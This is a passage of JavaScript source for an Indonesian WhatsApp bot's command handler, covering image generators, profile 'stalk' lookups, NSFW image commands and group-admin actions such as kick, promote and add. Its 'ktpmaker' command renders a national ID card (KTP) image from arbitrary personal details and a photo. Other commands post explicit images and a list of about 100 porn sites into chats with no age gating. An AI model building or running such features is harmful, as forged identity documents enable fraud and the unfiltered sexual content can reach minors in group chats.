                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${apikey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break

                    // Converter
                case 'togif':
                    if ((isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                        filePath = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".mp4")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            }
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            get_result = JSON.parse(body)
                            getBuffer(get_result.result).then(result => {
                                ikyc.sendMessage(from, result, video, { mimetype: Mimetype.gif })
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Reply stickernya kawan`)
                    }
                    break                

                    // Stalk
                case 'stalkig':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jessnolimit`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.photo_profile)
                    ini_txt = `Username : ${ini_result.username}\n`
                    ini_txt += `Full Name : ${ini_result.fullname}\n`
                    ini_txt += `Posts : ${ini_result.posts}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    ikyc.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalkgithub':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL-Human`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.avatar)
                    ini_txt = `Name : ${ini_result.name}\n`
                    ini_txt += `Link : ${ini_result.url}\n`
                    ini_txt += `Public Repo : ${ini_result.public_repos}\n`
                    ini_txt += `Public Gists : ${ini_result.public_gists}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    ikyc.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalktwitter':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jokowi`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.profile_picture)
                    ini_txt = `Username : ${ini_result.screen_name}\n`
                    ini_txt += `Name : ${ini_result.name}\n`
                    ini_txt += `Tweet : ${ini_result.tweet}\n`
                    ini_txt += `Joined : ${ini_result.joined}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Like : ${ini_result.like}\n`
                    ini_txt += `Description : ${ini_result.description}`
                    ikyc.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalktiktok':
                    if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
                    stalk_toktok = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Username : ${get_result.username}\n`
                    ini_txt += `Nickname : ${get_result.nickname}\n`
                    ini_txt += `Followers : ${get_result.followers}\n`
                    ini_txt += `Followings : ${get_result.followings}\n`
                    ini_txt += `Likes : ${get_result.likes}\n`
                    ini_txt += `Video : ${get_result.video}\n`
                    ini_txt += `Bio : ${get_result.bio}\n`
                    pp_tt = await getBuffer(get_result.user_picture)
                    ikyc.sendMessage(from, pp_tt, image, { quoted: iky, caption: ini_txt })
                    break
                    // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })                        
                    })
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wall':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break          

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${ini_txt}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: fhidetag })
                    })
                    break
                case 'tiktoks':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${apikey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${ini_txt}`).then((gambar) => {
                        ikyc.sendMessage(from, gambar, image, { quoted: iky })
                    })
                    break    
case 'event':
          pp = 'on or off?'
          but = [
           { buttonId: `!epen 1`, buttonText: { displayText: 'ON️' }, type: 1 },
           { buttonId: `!epen 0`, buttonText: { displayText: 'OFF' }, type: 1 }]
          sendButton(from, pp, 'Event Group', but, troli)
          break                                  
       case 'simi':              
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (!isGroup) return setReply('hanya bisa di group')
						if (isSimi) return setReply('Fitur sudah aktif kak')
						siminya.push(from);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isGroup) return setReply('hanya bisa di group')
						if (!isSimi) return setReply('Udah mati')
						siminya.splice(from, 1);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di matikan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}simi on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}simi off`, buttonText: { displayText: Off },type: 1}]);
                    } else {  
       if(isSimi) return   
	   simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
       sami = simi.success
       setReply(sami) 
       }
       break
 case 'linkbokep':
 reply(`𝙅𝘼𝙉 𝙇𝙐𝙋𝘼 𝘾𝙊𝙇𝙄 𝙆𝘼𝙆
(KUMPULAN LINK) ><

1 = www.xvideos.com
2 = www.xhamster.com
3 = www.xnxx.com
4 = www.pornhub.com
5 = www.redtube.com
6 = www.youporn.com
7 = www.snapdo.com
8 = www.livejasmin.com
9 = www.youjizz.com
10 = www.tube8.com
11 = www.dmm.co.jp
12 = www.cam4.com
13 = www.hardsextube.com
14 = www.ehentai.org
15 = www.beeg.com
16 = www.2ch.net
17 = www.kickass.to
18 = www.myfreecams.com
19 = www.imagefap.com
20 = www.chaturbate.com
21 = www.4chan.org
22 = www.drtuber.com
23 = www.adnxs.com
24 = www.webalta.ru
25 = www.abril.com.br
26 = www.lxxx.com
27 = www.largeporntube.com
28 = www.adultfriendfinder.com
29 = www.porn.com
30 = www.perfectgirls.com
31 = www.xtube.com
32 = www.nuvid.com
33 = www.nudevista.com
34 = www.videoone.com
35 = www.porntube.com
36 = www.bravotube.com
37 = www.yourlust.com
38 = www.fuckedtube.com
39 = www.spankwire.com
40 = www.adam4adam.com
41 = www.motherless.com
42 = www.pornerbros.com
43 = www.batepapo.uol.com.br
44 = www.4tube.com
45 = www.sunporno.com
46 = www.eroprofile.com
47 = www.saymove.org
48 = www.streamcloud.eu
49 = www.pornmd.com
50 = www.keezmovies.com
51 = www.h2porn.com
52 = www.contenko.com
53 = www.xhamstercams.com
54 = www.pornhublive.com
55 = www.ryushare.com
56 = www.ikycporno.com
57 = www.anysex.com
58 = www.adultempire.com
59 = www.brazzers.com
60 = www.sambaporno.com
61 = www.clarosearch.com
62 = www.tubegalore.com
63 = www.videosexarchive.com
64 = www.exhentai.org
65 = www.tnaflix.com
66 = www.redtubelive.com
67 = www.vporn.com
68 = www.fakku.net
69 = www.anitube.se
70 = www.pornoxo.com
71 = www.freeones.com
72 = www.youjizzlive.com
73 = www.petardas.com
74 = www.woozworld.com
75 = www.literotica.com
76 = www.dojki.com
77 = www.manhunt.net
78 = www.ashemaletube.com
79 = www.ultrasurf.us
80 = www.gayromeo.com
81 = www.liveinternet.ru
82 = www.roulettebotplus.com
83 = www.pornsharía.com
84 = www.rarbg.com
85 = www.extremetube.com
86 = www.dmm.com
87 = www.juicyads.com
88 = www.hellporn.com
89 = www.gonzoxxxmovies.com
90 = www.cerdas.com
91 = www.slutload.com
92 = www.dafiti.com.br
93 = www.exposedwebcams.com
94 = www.Dlsite.com
95 = www.cliphunter.com
96 = www.xdating.com
97 = www.asg.to
98 = www.super.cz
99 = www.ahme.com
100 = www.fapdu.com`)
break
            
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
linkgc = await ikyc.groupInviteCode(from)
yeh = `*「 Link Group 」*\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
ikyc.sendMessage(from, yeh, text, { quoted: iky })
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
                    }
if (args[0] === 'open') {

await  ikyc.groupSettingChange(from, GroupSettingChange.messageSend, false)
await setReply('_Success_')
} else if (args[0] === 'close') {
 await ikyc.groupSettingChange(from, GroupSettingChange.messageSend, true)
await setReply('_Success_')
}
                 break;


case 'setdesc':
case 'setdesk':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if(!q) return setReply("Teksnya apa")
ikyc.groupUpdateDescription(from, q)
setReply("Succes")
break

case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					ikyc.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
					break	





	case 'unadmin':
	case 'demote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
ikyc.groupDemoteAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes demote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[nomor]}})

} else if (iky.message.extendedTextMessage.contextInfo.participant) {
premnih = iky.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
ikyc.groupDemoteAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes demote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[premnih]}})

 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
ikyc.groupDemoteAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes demote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    










case 'admin':
	case 'promote':
	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
ikyc.groupMakeAdmin(from, [nomor])
teks = `Members @${nomor.split('@')[0]} succes promote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[nomor]}})

} else if (iky.message.extendedTextMessage.contextInfo.participant) {
premnih = iky.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
ikyc.groupMakeAdmin(from, [premnih])
teks = `Members @${premnih.split('@')[0]} succes promote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[premnih]}})

 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
ikyc.groupMakeAdmin(from, [lulu])
teks = `Members @${lulu.split('@')[0]} succes promote`
ikyc.sendMessage(from, teks, text, {quoted:iky, contextInfo:{mentionedJid:[lulu]}})
   } else{
 setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
 }
break    
case 'revoke':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await ikyc.revokeInvite(from)
await setReply('_Success_')
break

    
    
    case "antihidetag":
        if (!isGroup) return setReply("Khusus di grup");
        if (!isGroupAdmins) return sendSticker(hanyaadmin)
		if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isAntihidetag) return setReply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          setReply("Sukses mengaktifkan antihidetag!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          setReply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;				
					case 'antivo':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
					     if(isZadani) return
          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          
          if (isAntiviewonce) return setReply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          setReply("Sukses mengaktifkan antiviewonce!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
           
          if (!isAntiviewonce) return setReply("Sudah mati!!");       
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          setReply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
case 'kickrandom':			
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
	 	    if (!isGroup) return reply(replygrub)
			if (!isGroupAdmins) return reply(replyadmin)
			if (!isBotGroupAdmins) return reply(replyadminbot)
	 	    const A11 = groupMembers
 		    const C11 = A11[Math.floor(Math.random() * A11.length)]
 		    var kic = `${C11.jid.split('@')[0]}@s.whatsapp.net`                   		    
		    F1 = 'MENCARI MEMBER (RANDOM)'	 	    
	 	    D1 = `SUKSES KICK RANDOM USER @${C11.jid.split('@')[0]}`
	 	    reply(F1)	 	  
		    setTimeout( () => { 
	  	    ikyc.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
	  	    }, 3000)    
	  	    setTimeout( () => {  
	  	    reply(D1)
	  	    }, 4000)     
	 	    break					
 case 'kickbeban':			
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
	 	    if (!isGroup) return reply(replygrub)
			if (!isGroupAdmins) return reply(replyadmin)
			if (!isBotGroupAdmins) return reply(replyadminbot)
	 	    const A15 = groupMembers
 		    const C16 = A15[Math.floor(Math.random() * A15.length)]
 		    var kic = `${C16.jid.split('@')[0]}@s.whatsapp.net`                   		    
		    F2 = 'MENCARI MEMBER BEBAN'	 	    
	 	    D3 = `SUKSES KICK BEBAN USER @${C16.jid.split('@')[0]}`
	 	    reply(F2)	 	  
		    setTimeout( () => { 
	  	    ikyc.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
	  	    }, 3000)    
	  	    setTimeout( () => {  
	  	    reply(D3)
	  	    }, 4000)     
	 	    break				   
case 'kicktime5d':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = iky.message.extendedTextMessage.contextInfo.participant
if(iky.message.extendedTextMessage === ownerNumber[0]) return setReply('Tidak bisa kick owner')
aw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(aw)
                     }, 3300)
                   setTimeout( () => {
					ikyc.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 30000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 28000)
					setTimeout( () => {
					ikyc.groupRemove(from, [asu])
					}, 26000)
					setTimeout( () => {
					ikyc.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 24000)
					setTimeout( () => {
					ikyc.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 22000)				
					setTimeout( () => {
					setReply('lima')
					}, 15000)
					setTimeout( () => {
					setReply('empat')
					}, 10000)
					setTimeout( () => {
					setReply('tiga')
					}, 7000)
					setTimeout( () => {
					setReply('dua')
					}, 5000)
					setTimeout( () => {
					setReply('satu')
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')
					}, 0)
					} else {
                   if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
                    if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
                    uw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(uw)
                     }, 32000)
                   setTimeout( () => {
					ikyc.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 30000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 28000)
					setTimeout( () => {
					 ikyc.groupRemove(from, [mentioned[0]])
					}, 26000)
					setTimeout( () => {
					ikyc.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 24000)
					setTimeout( () => {
					ikyc.sendMessage(from, 'Asekk dapet dapet jatah kick ??', text)
					}, 22000)				
					setTimeout( () => {
					setReply('lima')
					}, 15000)
					setTimeout( () => {
					setReply('empat')
					}, 10000)
					setTimeout( () => {
					setReply('tiga')
					}, 7000)
					setTimeout( () => {
					setReply('dua')
					}, 5000)
					setTimeout( () => {
					setReply('satu')
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')					
					}, 0)
                    }
                     break  
					
					
					
					
					
					case 'kickme':
					try{
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await ikyc.groupRemove(from, [sender])
await setReply("Done wkwkw")
} catch (err){
	setReply(err)
	}
break    
    case 'kick':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await setReply(`Asek asek jatah kick euy 😋`);
await ikyc.groupRemove(from, [woke])
    
} else if (iky.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = iky.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await setReply( `Modar kena kick awokawok 🤣`);
await ikyc.groupRemove(from, [asu])
    
 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`Asek dapet jatah kick, Otw kick 😋`);
await ikyc.groupRemove(from, [mentioned[0]])

   } else{
 setReply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
 }
break    


case 'add':
try{
					if (!isGroup) return setReply(mess.only.group)
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin)     
					if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
                  	if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')
					  woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await ikyc.groupAdd(from, [woke])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return setReply('Eror, user private acc')
											if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
											if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
						await ikyc.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
						} else if (iky.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
entah = iky.message.extendedTextMessage.contextInfo.participant
													response = await ikyc.groupAdd(from, [entah])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return setReply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
                      await ikyc.sendMessage(from,`Berhasil menambahkan @${entah.split("@")[0]} ke dalam group ${groupName}`,text);          
                      } else{
						setReply("Reply atau input nomer target")
						}
						} catch (err){
						console.log(err)
						setReply("Terjadi Error, Tolong input nomer dengan benar")
							}
					break






case 'block':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await ikyc.blockUser(woke, "add")
await addBlock(woke, blocked)
await setReply( `Sukses block ${woke.split("@")[0]}`);
    
} else if (iky.message.extendedTextMessage.contextInfo.participant) {
